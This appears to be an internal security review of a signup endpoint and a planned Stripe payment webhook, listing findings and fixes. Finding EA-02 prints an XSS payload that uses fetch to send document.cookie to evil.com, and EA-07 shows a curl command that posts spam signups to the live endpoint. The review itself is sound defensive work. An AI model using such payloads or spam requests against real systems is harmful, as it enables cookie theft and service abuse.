## 1. Early Access Endpoint Security Review

### 1.1 Implementation Summary

The Early Access endpoint replaces an external LaunchList integration with an internal `POST /api/early-access/signup` endpoint. The endpoint accepts a name and email, validates them, detects the user's locale from request headers, and sends notification emails to two internal recipients via an n8n webhook.

### 1.2 Input Validation

**Current state:** Basic validation exists. Name must be non-empty/non-whitespace. Email is checked with a regex pattern `^[^@\s]+@[^@\s]+\.[^@\s]+$`. Both fields are `.strip()`-ed before processing.

| Check | Status | Assessment |
|---|---|---|
| Name required (non-empty) | Present | Adequate |
| Name whitespace-only rejected | Present | Adequate |
| Email required | Present | Adequate |
| Email format validated | Present | Basic but acceptable for this scope |
| Name max length enforced | **ABSENT** | **FINDING: No upper bound on name length** |
| Email max length enforced | **ABSENT** | **FINDING: No upper bound on email length** |
| Name character restrictions | **ABSENT** | **FINDING: Allows any characters including HTML/script** |
| Email character restrictions | Partial | Regex excludes `@` and whitespace from local/domain parts, but does not limit total length |

**FINDING EA-01 (Medium): No input length limits.** The `name` and `email` fields accept arbitrarily long strings. An attacker could submit a name of 10MB, which would be:
- Forwarded to the n8n webhook (potential payload bomb)
- Embedded in the email body (potential email rendering issues)
- Held in Lambda memory during processing

**Recommendation:** Add maximum length checks. 200 characters for name, 254 characters for email (RFC 5321 maximum). Add these checks in `validate_signup()`.

**FINDING EA-02 (Medium): HTML injection in notification email body.** The `build_email_body()` method constructs an HTML email body using f-strings:
```python
body = (f'New Early Access signup received.<br><br>'
        f'<b>Name:</b>      {name}<br>'
        f'<b>Email:</b>     {email}<br>'
        ...)
```
User-supplied `name` and `email` values are interpolated directly into HTML without escaping. An attacker could submit:
- `name = "<script>alert('xss')</script>"` — script injection in email
- `name = "<img src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>"` — active content in email

The impact is limited because the recipients are internal team members (Sherpa and Dinis), not external users. However, email clients that render HTML could execute injected content.

**Recommendation:** HTML-escape the `name` and `email` values before embedding them in the email body. Use `html.escape()` from Python's standard library. Example:
```python
import html
name_safe  = html.escape(name)
email_safe = html.escape(email)
```

**FINDING EA-03 (Low): Email validation regex is permissive.** The regex `^[^@\s]+@[^@\s]+\.[^@\s]+$` accepts technically valid but unusual addresses and could accept some edge cases that are not real addresses. It does not check:
- Domain has valid TLD (e.g., `user@localhost.x` would pass)
- No consecutive dots in domain
- Local part length vs domain length constraints

**Assessment:** This is acceptable for an early access signup form. The brief explicitly states "email looks valid" as the validation bar. Full RFC 5322 compliance is not needed. The regex is sensible for the use case.

### 1.3 Rate Limiting

**Current state: NO rate limiting exists on this endpoint.**

The endpoint is publicly accessible (no authentication required) on the User Lambda. There is no rate limiting at any layer:
- No application-level rate limiting in the route or service
- No middleware-level rate limiting in FastAPI setup
- No API Gateway (Lambda URL functions are used directly)
- No mention of CloudFront rate limiting for API routes

**FINDING EA-04 (High): No rate limiting on signup endpoint.** Without rate limiting, an attacker can:
1. **Spam the notification system** — send thousands of signup requests, flooding the two recipient inboxes with notification emails
2. **Abuse the n8n webhook** — each signup triggers an HTTP POST to n8n, which then sends emails. This could exhaust n8n quotas or trigger rate limits on WorkMail/SES
3. **Lambda cost attack** — each invocation costs money. A sustained flood could generate unexpected AWS bills
4. **Email reputation damage** — if thousands of emails are sent from the WorkMail/SES sender, the sender's reputation score could be damaged, affecting deliverability for legitimate emails

The brief explicitly states: "Rate limiting beyond basic sanity (we can add this later if needed; the Challenge campaign will send ~50-100 people max)." The brief anticipated low volume, but the endpoint is publicly accessible on the internet.

**Recommendation (Priority 1 — before production):**
- **Immediate:** Add a simple in-memory rate limiter at the application level. Limit to 5 requests per IP per minute, 20 per IP per hour. Since Lambda is stateless, this would need to use a shared store (DynamoDB, Redis) or be implemented at the CloudFront/WAF layer.
- **Practical alternative for Lambda:** Add AWS WAF rate-based rules on the Lambda URL or CloudFront distribution. A rule limiting `/api/early-access/signup` to 10 requests per 5 minutes per IP would be sufficient for the expected volume.
- **Quick win:** Add a simple timing-based throttle — if the n8n webhook call takes <100ms (suggesting it was not actually called), add a small delay to prevent rapid-fire submissions.

### 1.4 Data Exposure

**Current state:** The response returns:
```python
return dict(success   = True,
            email     = email,
            timestamp = result['timestamp'])
```

**FINDING EA-05 (Low): Response echoes the submitted email.** The endpoint reflects the email address back in the response. This is a minor information disclosure — the email was submitted by the user, so they already know it. However:
- It confirms the email was accepted and processed (useful for enumeration if a persistence layer is added later)
- The brief's UX spec shows the email in the confirmation message ("We'll send your access token to {email}"), so this is intentional

**Assessment:** Acceptable for current scope. The email was submitted by the same user. No additional data is leaked. The `timestamp` is server-generated and non-sensitive.

**The response does NOT leak:**
- Notification delivery status (success/failure of n8n webhook)
- Internal recipient addresses
- n8n webhook URL or configuration
- Other signups or counts

This is good. The notification results are correctly discarded in the route handler — only `timestamp` is returned from the service result.

### 1.5 CORS Implications

**Current state:** The User Lambda has CORS configured with `allow_origins = ["*"]` (all origins). This means any website can make cross-origin POST requests to `/api/early-access/signup`.

**FINDING EA-06 (Medium): Wildcard CORS origin with credentials.** The CORS middleware is configured with:
```python
allow_origins     = ["*"]
allow_credentials = True
```

This combination is technically invalid per the CORS spec — when `allow_credentials = True`, the `Access-Control-Allow-Origin` header cannot be `*`. Most browsers will reject this. However, Starlette's `CORSMiddleware` handles this by reflecting the request's `Origin` header back as the allowed origin when credentials are enabled and the origin list includes `*`. This means **any origin is effectively allowed with credentials**.

For the early access endpoint specifically, this means any third-party website could embed a form that submits signups to SG/Send. This amplifies the spam/abuse vector (EA-04).

**Assessment:** The wildcard CORS is likely needed for the broader User Lambda (transfer endpoints need to work from various origins). The early access endpoint inherits this configuration. This is acceptable given the public nature of the signup form, but reinforces the need for rate limiting.

### 1.6 Spam and Abuse Prevention

**Current state: No spam or abuse prevention mechanisms exist.**

| Control | Status |
|---|---|
| CAPTCHA / reCAPTCHA | Not implemented |
| Honeypot field | Not implemented |
| Rate limiting | Not implemented |
| IP blocking | Not implemented |
| Email verification (double opt-in) | Not implemented |
| Duplicate submission detection | Not implemented |
| Bot detection (JS challenge, timing) | Not implemented |

**FINDING EA-07 (Medium): No bot protection.** The endpoint is a simple POST with a JSON body. There is no mechanism to distinguish human form submissions from automated bot traffic. A script can submit thousands of fake signups with:
```bash
curl -X POST https://send.sgraph.ai/api/early-access/signup \
     -H 'Content-Type: application/json' \
     -d '{"name":"bot","email":"bot@spam.com"}'
```

**Recommendations (tiered):**
1. **Minimum viable (before launch):** Rate limiting (see EA-04)
2. **Short term:** Add a honeypot field — an invisible form field that bots fill in but humans do not. If the field contains a value, reject the submission silently
3. **Medium term:** Add a simple proof-of-work or JS-generated token that the frontend must compute and include in the request. The backend validates the token before processing
4. **Not recommended for now:** Full CAPTCHA — too heavy for a simple signup form and degrades UX

## 2. Payment Webhook Security Assessment

**Note:** This section reviews the brief at `v0.10.1__brief__payment-notification-pipeline.md`. This is a PROPOSED feature — it does not exist yet. The assessment evaluates the brief's security design and identifies controls that must be present before implementation.

### 2.1 Stripe Webhook Signature Verification

The brief correctly identifies this as critical:
> "The endpoint MUST verify the signature -- don't just trust any POST to this URL."

**Assessment:** The brief's security instinct is correct. Stripe webhook signature verification is non-negotiable. The implementation must:

1. **Retrieve the raw request body** — Stripe signatures are computed over the raw bytes, not parsed JSON. FastAPI parses the body by default. The endpoint must access `request.body()` (the raw bytes) before JSON parsing.
2. **Use the Stripe webhook signing secret** — stored as an environment variable or in AWS Secrets Manager, never in code.
3. **Call `stripe.Webhook.construct_event()`** — this is the official verification method. It checks the `Stripe-Signature` header against the raw body using HMAC-SHA256.
4. **Reject requests that fail verification** — return 400/401 immediately.
5. **Handle replay attacks** — Stripe includes a timestamp in the signature. The verification method has a default tolerance of 300 seconds. Do not increase this.

**FINDING PW-01 (Critical — must implement): Stripe signature verification is table stakes.** Without it, anyone who discovers the webhook URL can forge payment events, triggering fake notifications and potentially triggering manual token creation for non-paying users. This is a direct path to fraud.

**Recommendation:** Use the `stripe` Python library for verification. Do not implement HMAC verification manually — the library handles timestamp tolerance, signature parsing, and constant-time comparison.

```python
import stripe
stripe.Webhook.construct_event(
    payload   = raw_body,
    sig_header = request.headers.get('stripe-signature'),
    secret    = webhook_signing_secret
)
```

**Important note on the stack:** The project uses `osbot-aws` and prohibits `boto3` directly. The `stripe` library is a separate vendor SDK (not AWS). Confirm it is acceptable to add `stripe` as a dependency. If not, manual HMAC-SHA256 verification is possible but more error-prone.

### 2.2 Webhook Endpoint Authentication

The brief places the webhook on the Admin API: `POST /admin/webhooks/stripe`.

**Assessment:** Good placement. The Admin Lambda has existing authentication infrastructure (API key-based access). However, the webhook endpoint has a unique authentication model:

| Consideration | Recommendation |
|---|---|
| Stripe signature is the auth mechanism | The endpoint should NOT require the standard `x-sgraph-access-token` header — Stripe cannot send it |
| But the endpoint must be reachable | It needs to be exempt from any global auth middleware on the Admin Lambda |
| Other admin endpoints remain protected | Only the webhook path is exempt |

**FINDING PW-02 (High): Webhook endpoint must bypass normal admin auth while maintaining its own auth.** The implementation must carefully carve out an exception for the webhook path without weakening security on other admin endpoints. The Stripe signature header IS the authentication — it is cryptographically verified and bound to the payload.

**Recommendation:** Implement the webhook route with explicit signature verification as a precondition. Do not rely on middleware — make the verification the first operation in the route handler, before any business logic.

### 2.3 Data Handling

The brief specifies extracting from the Stripe event:
- Customer email
- Amount paid
- Payment ID
- Timestamp

**Security considerations:**

| Data Element | Risk | Mitigation |
|---|---|---|
| Customer email | PII — appears in notification emails, SMS, WhatsApp | Accept this as necessary for the manual token creation workflow. Ensure it is not logged to CloudWatch beyond what Stripe sends |
| Amount paid | Financial data | Low sensitivity — it is always the same amount (5 GBP). Include in notifications for verification |
| Payment ID | Stripe internal ID | Non-sensitive. Useful for audit trail and deduplication |
| Timestamp | Event timing | Non-sensitive |

**FINDING PW-03 (Medium): Idempotency / deduplication.** Stripe may send the same webhook event multiple times (retry on failure, duplicate delivery). Without deduplication, the same payment could trigger 4+ notification emails/SMS/WhatsApp messages each time.

**Recommendation:** Store processed event IDs (the Stripe event ID) and skip duplicates. A simple in-memory set with a TTL would work for the expected volume, or use a DynamoDB table with a conditional write.

**FINDING PW-04 (Low): Customer email from Stripe should be treated as untrusted.** The email address in the Stripe event comes from the customer's input during checkout. If this email is interpolated into HTML email bodies, SMS messages, or WhatsApp messages, the same HTML injection risk from EA-02 applies.

**Recommendation:** Sanitise the customer email before including it in any notification body.

### 2.4 Notification Channel Security

The brief proposes four notification channels. Security assessment of each:

#### Email (via n8n/WorkMail)
- **Risk:** Same HTML injection risk as EA-02 if customer email is embedded in HTML
- **Risk:** Email content includes PII (customer email)
- **Mitigation:** Same as EA-02 — HTML-escape all user-supplied values. Use TLS for SMTP delivery (WorkMail enforces this by default)

#### SMS (via AWS SNS or Twilio)
- **Risk:** SMS is unencrypted in transit (carrier networks)
- **Risk:** SMS content includes customer email (PII)
- **Risk:** SMS spoofing — not relevant here (outbound only)
- **Mitigation:** Accept the inherent SMS risk. Keep message content minimal. Do not include payment ID or amount in SMS — just the customer email and action needed
- **Additional:** If using AWS SNS, the phone number must be verified. Use `osbot-aws` wrappers, not boto3 directly

#### WhatsApp (via Twilio/Business API)
- **Risk:** WhatsApp is end-to-end encrypted — better than SMS for PII
- **Risk:** WhatsApp Business API requires approved message templates — content must be pre-approved
- **Risk:** If using Twilio sandbox, messages are only delivered to verified numbers (acceptable for internal use)
- **Mitigation:** Use message templates with placeholders. Keep customer email as the only variable

#### All channels — credential management
- **FINDING PW-05 (High): Multiple new secrets to manage.** The payment pipeline introduces several new credentials:
  - Stripe webhook signing secret
  - Twilio account SID + auth token (if used for SMS/WhatsApp)
  - AWS SNS topic ARN (if used for SMS)
  - n8n webhook URL + secret (already exists)

  All must be stored in environment variables or AWS Secrets Manager, never in code. Each is a new attack surface if leaked.

**Recommendation:** Centralise secret management. Use AWS Systems Manager Parameter Store (via `osbot-aws`) for all webhook/API secrets. Audit access to these parameters via CloudTrail.

### 2.5 Rate Limiting on Webhook Endpoint

**FINDING PW-06 (Medium): Webhook endpoint needs rate limiting, but different from user-facing endpoints.** Stripe sends webhooks in bursts when multiple payments arrive, and retries failed deliveries. A rate limit that is too aggressive could cause Stripe to give up.

**Recommendation:**
- Do NOT apply the same rate limiting as user-facing endpoints
- Instead, combine Stripe signature verification (PW-01) with a reasonable rate limit (e.g., 100 requests per minute from Stripe's IP ranges)
- Stripe publishes its webhook IP ranges — consider allowlisting these at the WAF/CloudFront level as an additional layer (but never as the sole authentication — always verify the signature)

## 5. Positive Security Observations

The implementation gets several things right:

1. **No data persistence of signups** — the endpoint is notification-only. There is no signup database to breach. This is a strong security posture for the current stage.
2. **Webhook secret from environment variables** — the n8n webhook URL and secret are not hardcoded. They come from `N8N_WEBHOOK_URL` and `N8N_WEBHOOK_SECRET` env vars.
3. **Graceful failure on webhook misconfiguration** — if the webhook URL is not configured, the service returns a failure result without crashing. The route handler still returns success to the user (the signup was received, even if the notification failed).
4. **No internal information leakage** — the response does not reveal notification success/failure, internal recipient addresses, or infrastructure details.
5. **Input trimming** — both name and email are `.strip()`-ed, preventing whitespace-padding attacks.
6. **Webhook timeout** — the `urllib.request.urlopen` call has a 10-second timeout, preventing indefinite hangs if n8n is unreachable.
7. **Clear separation of concerns** — Route (validation + response), Service (business logic + notification), Schema (data model). This makes it straightforward to add security controls at the right layer.
8. **The brief's security instinct on Stripe webhooks is correct** — explicitly calling out "MUST verify the signature" shows security awareness at the requirements level.

## 6. Alignment with Zero-Knowledge Architecture

The Early Access endpoint does NOT handle encrypted files or decryption keys. It is a simple signup form. However, it is part of the `send.sgraph.ai` domain and shares the zero-knowledge brand promise.

**Key consideration:** The brief identified the original problem: "For a zero-knowledge encryption product, this is a trust violation at the worst possible moment." The replacement endpoint resolves this by keeping users on-domain. From a trust perspective, the endpoint should be as secure as the rest of the application — any vulnerability here could undermine user confidence in the broader product.

The endpoint does not violate any zero-knowledge principles:
- No plaintext file data is involved
- No decryption keys are involved
- The only PII collected (name, email) is explicitly provided by the user for the purpose of signup
- The PII is not stored on the server (notification-only pattern)
